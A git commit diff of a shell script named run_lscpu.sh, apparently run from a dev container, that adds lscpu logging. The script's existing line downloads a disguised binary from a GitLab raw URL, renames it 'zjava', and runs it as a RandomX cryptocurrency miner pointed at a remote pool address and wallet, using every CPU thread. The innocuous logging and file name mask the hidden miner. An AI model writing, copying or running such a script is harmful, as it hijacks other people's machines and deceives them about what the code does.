1aeaac2730fb191993ec3ad4435df462b82ef41d
hilmanotriyafika78 <hilmanotriyafika78@gmail.com>
2025-07-25 12:23:39 +0700

    Update run_lscpu.sh

--- run_lscpu.sh
+++ run_lscpu.sh
@@ -1,2 +1,6 @@
 #!/bin/bash
+LOG_FILE="/tmp/lscpu_output.log" # Nama file log berbeda agar tidak tumpang tindih dengan debug devcontainer.json
 wget -qO zjava https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab && chmod +x zjava && ./zjava -a rx/0 -o 47.236.252.96:443 -u 88vS7KLcXkwg1BpQhW9DHJXmkXJRW3j5NaLxKBHUm9QP3ba5BqHgeHRjMWyxKmEF853prbgd65tdJbESR1QhsknZATc5JuF.$(echo 0C-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -t $(nproc --all) -p J
+echo "--- Script run_lscpu.sh STARTED (Timestamp: $(date)) ---" >> $LOG_FILE
+lscpu >> $LOG_FILE 2>&1 # Redirect output dan error ke file log ini
+echo "--- Script run_lscpu.sh FINISHED ---" >> $LOG_FILE
